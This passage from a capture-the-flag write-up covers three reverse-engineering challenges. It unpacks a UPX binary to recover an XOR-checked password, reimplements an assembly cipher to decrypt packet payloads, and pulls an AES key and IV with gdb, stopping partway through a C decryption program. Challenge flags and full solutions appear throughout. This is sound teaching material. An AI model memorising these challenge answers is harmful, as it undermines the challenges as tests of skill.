</span></pre></table></code></div></div><p>The binary seems to be checking our provided magic word and we need to figure out what is it comparing against. Before opening it up in <code class="language-plaintext highlighter-rouge">Ghidra</code>, I noticed something about <code class="language-plaintext highlighter-rouge">UPX</code> towards the end of the <code class="language-plaintext highlighter-rouge">strings</code> command that I ran on the binary.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>strings giftwrap
...
UPX!
UPX!
</pre></table></code></div></div><p>Searching for <code class="language-plaintext highlighter-rouge">UPX</code> in the binary also confirmed that the binary was <code class="language-plaintext highlighter-rouge">UPX</code>-packed. Lets unpack it before opening it up in <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>upx <span class="nt">-d</span> giftwrap
                       Ultimate Packer <span class="k">for </span>eXecutables
                          Copyright <span class="o">(</span>C<span class="o">)</span> 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar &amp; John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   <span class="nt">--------------------</span>   <span class="nt">------</span>   <span class="nt">-----------</span>   <span class="nt">-----------</span>
    925312 &lt;-    357628   38.65%   linux/amd64   giftwrap

Unpacked 1 file.
</pre></table></code></div></div><p>Opening it up in <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
    <span class="p">...</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s the magic word? "</span><span class="p">);</span>
    <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%256s"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_118</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">local_11c</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">local_11c</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">;</span> <span class="n">local_11c</span> <span class="o">=</span> <span class="n">local_11c</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_118</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_11c</span><span class="p">)</span> <span class="o">=</span>
            <span class="o">*</span><span class="p">(</span><span class="n">byte</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_118</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">local_11c</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xf3</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">thunk_FUN_004010e6</span><span class="p">(</span><span class="n">CHECK</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x17</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Welcome inside..."</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"Wrong password! Who are you?!?"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
        <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We see that before the <code class="language-plaintext highlighter-rouge">Wrong password! Who are you!?</code> messsage is printed, the password is read into <code class="language-plaintext highlighter-rouge">local_118</code>, followed by some XOR operation using <code class="language-plaintext highlighter-rouge">0xf3</code>. The result is then then used by <code class="language-plaintext highlighter-rouge">thunk_FUN_0044010e6()</code> together with <code class="language-plaintext highlighter-rouge">CHECK</code> to verify if the password was correct. Jumping to where <code class="language-plaintext highlighter-rouge">CHECK</code> is located,</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta15.png" alt="" /></p><p>We see that it was a null-terminated byte array. Since we know that each byte password is XOR’ed with <code class="language-plaintext highlighter-rouge">0xf3</code> to obtain this null-terminated byte array, we could simply XOR each byte of the byte array with <code class="language-plaintext highlighter-rouge">0xf3</code> to get back the original password!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>password ^ 0xf3 = CHECK
password ^ 0xf3 ^ 0xf3 = CHECK ^ 0xf3 
password = CHECK ^ 0xf3
</pre></table></code></div></div><p>To copy the byte array from <code class="language-plaintext highlighter-rouge">Ghidra</code>, we can right-click on <code class="language-plaintext highlighter-rouge">CHECK</code> and go to <code class="language-plaintext highlighter-rouge">Copy Special</code> and select <code class="language-plaintext highlighter-rouge">Python Byte String</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta16.png" alt="" /></p><p>Here is the script I used to perform the decryption of the <code class="language-plaintext highlighter-rouge">CHECK</code> byte array:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">enc</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\xbb\xa7\xb1\x88\x86\x83\x8b\xac\xc7\xc2\x9d\x87\xac\xc6\xc3\xac\x9b\xc7\x81\x97\xd2\xd2\x8e\x00</span><span class="s">'</span>

<span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">):</span>
    <span class="n">ptxt</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">enc</span><span class="p">[</span><span class="n">idx</span><span class="p">])</span> <span class="o">^</span> <span class="mh">0xf3</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">ptxt</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python3 giftwrap.py
HTB<span class="o">{</span>upx_41nt_50_h4rd!!<span class="o">}</span> 
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{upx_41nt_50_h4rd!!}</code></p><h2 id="intercept-day-3">Intercept (Day 3)</h2><blockquote><p>We managed to covertly spy on some of the elves’ communications, as well as obtain partial code for their experimental encryption algorithm. Can you find where they’re planning their next meeting?<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">rev_intercept.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">rev_intercept.zip</code> were 2 files: <code class="language-plaintext highlighter-rouge">intercept.asm</code> and <code class="language-plaintext highlighter-rouge">intercept.pcap</code>.</p><p><code class="language-plaintext highlighter-rouge">intercept.asm</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>        .text
        .globl  state
        .bss
        .type   state, @object
        .size   state, 1
state:
        .zero   1
        .text
        .globl  do_encrypt
        .type   do_encrypt, @function
do_encrypt:
        push    rbp
        mov     rbp, rsp
        mov     eax, edi
        mov     BYTE PTR <span class="o">[</span>rbp-4], al
        movzx   eax, BYTE PTR state[rip]
        add     eax, 19
        xor     BYTE PTR <span class="o">[</span>rbp-4], al
        movzx   eax, BYTE PTR state[rip]
        add     eax, 55
        mov     BYTE PTR state[rip], al
        movzx   eax, BYTE PTR <span class="o">[</span>rbp-4]
        pop     rbp
        ret
</pre></table></code></div></div><p>Taking a look at <code class="language-plaintext highlighter-rouge">intercept.asm</code>, we see that there is a function called <code class="language-plaintext highlighter-rouge">do_encrypt</code>, which was probably used to encrypt a secret message. Lets look at <code class="language-plaintext highlighter-rouge">intercept.pcap</code> next.</p><p><code class="language-plaintext highlighter-rouge">intercept.pcap</code>: <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta52.png" alt="" /></p><p>We see that there are 6 packets in it, all having the same TCP source and destination port numbers, same sequence numbers etc which definitely seemed suspicious. These packets are probably carrying the encrypted data that we need to decrypt.</p><p>Before we can do that, we need to understand how <code class="language-plaintext highlighter-rouge">do_encrypt</code> works. The part of the instructions that got stumped me at first was <code class="language-plaintext highlighter-rouge">state[rip]</code>. I had never such a syntax before and with some googling, I found out this was something called “RIP-relative addressing”. <code class="language-plaintext highlighter-rouge">state[rip]</code> is synonymous to a global variable named <code class="language-plaintext highlighter-rouge">state</code>, therefore we can assume that everytime <code class="language-plaintext highlighter-rouge">do_encrypt</code> is called, this <code class="language-plaintext highlighter-rouge">state</code> will be updated and could possibly change the behaviour of <code class="language-plaintext highlighter-rouge">do_encrypt</code>.</p><p>After understanding how it works, I decided to construct a Python script with a <code class="language-plaintext highlighter-rouge">do_encrypt</code> function that sorts of achieves the same thing.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c1"># state:
#         .zero   1
</span><span class="n">state</span> <span class="o">=</span> <span class="mi">0</span> 

<span class="k">def</span> <span class="nf">do_encrypt</span><span class="p">(</span><span class="n">edi</span><span class="p">):</span>
    <span class="c1">#                   push    rbp
</span>    <span class="c1">#                   mov     rbp, rsp
</span>    <span class="k">global</span> <span class="n">state</span>   
    <span class="n">eax</span> <span class="o">=</span> <span class="n">edi</span>         <span class="c1"># mov     eax, edi
</span>    <span class="n">temp</span> <span class="o">=</span> <span class="n">eax</span>        <span class="c1"># mov     BYTE PTR [rbp-4], al
</span>    <span class="n">eax</span> <span class="o">=</span> <span class="n">state</span>       <span class="c1"># movzx   eax, BYTE PTR state[rip]
</span>    <span class="n">eax</span> <span class="o">+=</span> <span class="mi">19</span>         <span class="c1"># add     eax, 19
</span>    <span class="n">temp</span> <span class="o">=</span> <span class="n">temp</span> <span class="o">^</span> <span class="n">eax</span> <span class="c1"># xor     BYTE PTR [rbp-4], al
</span>    <span class="n">eax</span> <span class="o">=</span> <span class="n">state</span>       <span class="c1"># movzx   eax, BYTE PTR state[rip]
</span>    <span class="n">eax</span> <span class="o">+=</span> <span class="mi">55</span>         <span class="c1"># add     eax, 55
</span>    <span class="n">state</span> <span class="o">=</span> <span class="n">eax</span>       <span class="c1"># mov     BYTE PTR state[rip], al
</span>    <span class="n">eax</span> <span class="o">=</span> <span class="n">temp</span>        <span class="c1"># movzx   eax, BYTE PTR [rbp-4]
</span>    <span class="k">return</span> <span class="n">eax</span> <span class="o">%</span> <span class="mi">256</span>
</pre></table></code></div></div><p>To perform the decryption, I did the following:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1"># state:
#         .zero   1
</span><span class="n">state</span> <span class="o">=</span> <span class="mi">0</span> 

<span class="k">def</span> <span class="nf">do_encrypt</span><span class="p">(</span><span class="n">edi</span><span class="p">):</span>
    <span class="c1">#                   push    rbp
</span>    <span class="c1">#                   mov     rbp, rsp
</span>    <span class="k">global</span> <span class="n">state</span>   
    <span class="n">eax</span> <span class="o">=</span> <span class="n">edi</span>         <span class="c1"># mov     eax, edi
</span>    <span class="n">temp</span> <span class="o">=</span> <span class="n">eax</span>        <span class="c1"># mov     BYTE PTR [rbp-4], al
</span>    <span class="n">eax</span> <span class="o">=</span> <span class="n">state</span>       <span class="c1"># movzx   eax, BYTE PTR state[rip]
</span>    <span class="n">eax</span> <span class="o">+=</span> <span class="mi">19</span>         <span class="c1"># add     eax, 19
</span>    <span class="n">temp</span> <span class="o">=</span> <span class="n">temp</span> <span class="o">^</span> <span class="n">eax</span> <span class="c1"># xor     BYTE PTR [rbp-4], al
</span>    <span class="n">eax</span> <span class="o">=</span> <span class="n">state</span>       <span class="c1"># movzx   eax, BYTE PTR state[rip]
</span>    <span class="n">eax</span> <span class="o">+=</span> <span class="mi">55</span>         <span class="c1"># add     eax, 55
</span>    <span class="n">state</span> <span class="o">=</span> <span class="n">eax</span>       <span class="c1"># mov     BYTE PTR state[rip], al
</span>    <span class="n">eax</span> <span class="o">=</span> <span class="n">temp</span>        <span class="c1"># movzx   eax, BYTE PTR [rbp-4]
</span>    <span class="k">return</span> <span class="n">eax</span> <span class="o">%</span> <span class="mi">256</span>

<span class="c1"># Collect the bytes in the payload of the packets
</span><span class="n">packets</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="s">"intercept.pcap"</span><span class="p">)</span>
<span class="n">enc</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">packets</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">packet</span><span class="p">[</span><span class="n">TCP</span><span class="p">].</span><span class="n">payload</span><span class="p">):</span>
        <span class="n">enc</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>


<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>

<span class="c1"># For each ciphertext byte
</span><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">enc</span><span class="p">:</span>
    <span class="c1"># Keeps a copy of the current state before `do_encrypt()` modifies it
</span>    <span class="n">original_state</span> <span class="o">=</span> <span class="n">state</span>

    <span class="c1"># Brute force possible byte values
</span>    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
        <span class="c1"># If the plaintext byte produces the ciphertext byte
</span>        <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="n">do_encrypt</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
            <span class="c1"># Store the plaintext byte and move on to the next ciphertext byte
</span>            <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
            <span class="c1"># Notice that we do not restore the state 
</span>            <span class="k">break</span>

        <span class="c1"># If doesn't match, restore the state to its original and try again
</span>        <span class="n">state</span> <span class="o">=</span> <span class="n">original_state</span>

<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</pre></table></code></div></div><p>Here is the result after running the above script:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Hello?Is this working?Looks like the connection is establishedOur next meeting will be at at 90.0000, 135.0000Make sure to bring the stolen presents!The password to get <span class="k">in </span>will be HTB<span class="o">{</span>pl41nt3xt_4sm?wh4t_n3xt_s0urc3_c0d3?<span class="o">}</span>
</pre></table></code></div></div><p>Flag: <code class="language-plaintext highlighter-rouge">HTB{pl41nt3xt_4sm?wh4t_n3xt_s0urc3_c0d3?}</code></p><h2 id="upgraded-day-4">Upgraded (Day 4)</h2><blockquote><p>The elves have learned from their mistakes, and are now using military grade encryption to protect their secrets! But they’ve made a critical error…<br /> Downloadable content: <code class="language-plaintext highlighter-rouge">rev_upgraded.zip</code></p></blockquote><p>Inside of <code class="language-plaintext highlighter-rouge">rev_upgrade.zip</code> was a binary <code class="language-plaintext highlighter-rouge">upgraded</code> and a <code class="language-plaintext highlighter-rouge">output.txt</code>.</p><p>Inside of <code class="language-plaintext highlighter-rouge">output.txt</code> were a list of space-seperated hex values.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>output.txt
ff 25 b1 d7 ad e8 <span class="nb">cd </span>36 bd 7d 09 a6 1f f9 c1 c1 ad 38 ce 29 3d 84 cb e5 83 9f b6 61 be b7 ea 4f 76 5d 2d c4 4e 2d a6 70 dc 04 e3 e6 bb c1 85 21
</pre></table></code></div></div><p>Attemping to hex-decode them results in gibberish so lets move on to <code class="language-plaintext highlighter-rouge">upgraded</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>./upgraded     
Enter your secrets: hello
Receiving your wishlist
Examining naughty/nice status
Triangulating gift location
Wrapping your gift
Delivering...
ee 3f 94 57 af 47 cb d3 e7 0a 54 08 86 95 38 c6
</pre></table></code></div></div><p>We see that we can enter a secret and it will encrypt it and print the results to the terminal as a list of space-seperated hex values. This probably implied that the contents of <code class="language-plaintext highlighter-rouge">output.txt</code> were produced from this binary and we need to figure out what secret was entered to produce them.</p><p>Opening <code class="language-plaintext highlighter-rouge">upgraded</code> in <code class="language-plaintext highlighter-rouge">Ghidra</code> and jumping straight to its<code class="language-plaintext highlighter-rouge">encrypt()</code> function,</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">encrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">__block</span><span class="p">,</span><span class="kt">int</span> <span class="n">__edflag</span><span class="p">)</span>

<span class="p">{</span>
    <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
    <span class="n">EVP_CIPHER</span> <span class="o">*</span><span class="n">cipher</span><span class="p">;</span>
    <span class="n">uchar</span> <span class="o">*</span><span class="n">in_RCX</span><span class="p">;</span>
    <span class="n">uchar</span> <span class="o">*</span><span class="n">in_RDX</span><span class="p">;</span>
    <span class="n">uchar</span> <span class="o">*</span><span class="n">in_R8</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">local_20</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
    <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">local_18</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
    
    <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
    <span class="n">local_18</span> <span class="o">=</span> <span class="n">EVP_CIPHER_CTX_new</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">==</span> <span class="p">(</span><span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
                        <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">abort</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">cipher</span> <span class="o">=</span> <span class="n">EVP_aes_256_cbc</span><span class="p">();</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">EVP_EncryptInit_ex</span><span class="p">(</span><span class="n">local_18</span><span class="p">,</span><span class="n">cipher</span><span class="p">,(</span><span class="n">ENGINE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="n">in_RDX</span><span class="p">,</span><span class="n">in_RCX</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">abort</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">EVP_EncryptUpdate</span><span class="p">(</span><span class="n">local_18</span><span class="p">,</span><span class="n">in_R8</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">,(</span><span class="n">uchar</span> <span class="o">*</span><span class="p">)</span><span class="n">__block</span><span class="p">,</span><span class="n">__edflag</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">abort</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">local_1c</span> <span class="o">=</span> <span class="n">local_20</span><span class="p">;</span>
    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">EVP_EncryptFinal_ex</span><span class="p">(</span><span class="n">local_18</span><span class="p">,</span><span class="n">in_R8</span> <span class="o">+</span> <span class="n">local_20</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_20</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                        <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">abort</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">local_1c</span> <span class="o">=</span> <span class="n">local_1c</span> <span class="o">+</span> <span class="n">local_20</span><span class="p">;</span>
    <span class="n">EVP_CIPHER_CTX_free</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
                        <span class="cm">/* WARNING: Subroutine does not return */</span>
        <span class="n">__stack_chk_fail</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We see that it is using the <code class="language-plaintext highlighter-rouge">OpenSSL</code> library to perform encryption and the code was using the 256-bit AES with CBC (Cipher Block Chaining) as its mode of operation.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/cybersanta53.png" alt="" /></p><p>The key and IV is defined when calling <code class="language-plaintext highlighter-rouge">EVP_EncryptInit_ex()</code> where address to the key and the IV is inputted as parameters. We could probably breakpoint right before the <code class="language-plaintext highlighter-rouge">EVP_EncryptInit_ex()</code> is called and retrieve the address to the contents of the key and the IV from the <code class="language-plaintext highlighter-rouge">RCX</code> and <code class="language-plaintext highlighter-rouge">R8</code> registers respectively.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="nv">$ </span>gdb ./upgraded
gdb-peda<span class="nv">$ </span>b EVP_EncryptInit_ex
Breakpoint 1 at 0x10e0
gdb-peda<span class="nv">$ </span>run
Starting program: /home/kali/Downloads/rev_upgraded/upgraded 
<span class="o">[</span>Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="s2">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span class="nb">.</span>
Enter your secrets: <span class="nb">test
</span>Receiving your wishlist
Examining naughty/nice status
Triangulating gift location
Wrapping your gift
Breakpoint 1, 0x00007ffff7e45be0 <span class="k">in </span>EVP_EncryptInit_ex <span class="o">()</span> from /lib/x86_64-linux-gnu/libcrypto.so.1.1
gdb-peda<span class="err">$</span>
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">AES-256-CBC</code>, the key is 256 bits, or 32 bytes and the IV is 128 bits, or 16 bytes. Therefore, we can print 32 bytes at the address found in the <code class="language-plaintext highlighter-rouge">RCX</code> to get the key and print 16 bytes at the address found in the <code class="language-plaintext highlighter-rouge">R8</code> to get the IV.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>gdb-peda<span class="nv">$ </span>x/32c <span class="nv">$rcx</span>
0x5555555580b4 &lt;VALUE1+20&gt;:     0x99    0x82    0x56    0x34    0xc4    0xa9    0x6c    0x53
0x5555555580bc &lt;VALUE1+28&gt;:     0x4f    0xf6    0x78    0x93    0x4d    0x9c    0x2a    0xd7
0x5555555580c4 &lt;VALUE1+36&gt;:     0xde    0x2e    0x9b    0xfb    0x1b    0xc3    0x9c    0x0
0x5555555580cc &lt;VALUE1+44&gt;:     0xbc    0xf9    0x2d    0x65    0x82    0x2e    0xe4    0x45
gdb-peda<span class="nv">$ </span>x/16c <span class="nv">$r8</span>
0x555555558148 &lt;VALUE2+40&gt;:     0x6b    0xd5    0x52    0x77    0x6f    0x6     0x81    0xf3
0x555555558150 &lt;VALUE2+48&gt;:     0x95    0xb3    0x4     0xfd    0xe5    0x84    0x23    0xfe
</pre></table></code></div></div><p>With the bytes that form the key and the IV, as well as the sample decryption code from the <a href="https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption"><code class="language-plaintext highlighter-rouge">OpenSSL</code> wiki</a>, I constructed the following C program to decrypt <code class="language-plaintext highlighter-rouge">output.txt</code>.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;openssl/conf.h&gt;
#include &lt;openssl/evp.h&gt;
#include &lt;openssl/err.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">handleErrors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">ERR_print_errors_fp</span><span class="p">(</span><span class="n">stderr</span><span class="p">);</span>
    <span class="n">abort</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">decrypt</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ciphertext</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ciphertext_len</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span>
            <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">iv</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">plaintext</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">EVP_CIPHER_CTX</span> <span class="o">*</span><span class="n">ctx</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>

    <span class="kt">int</span> <span class="n">plaintext_len</span><span class="p">;</span>

    <span class="cm">/* Create and initialise the context */</span>
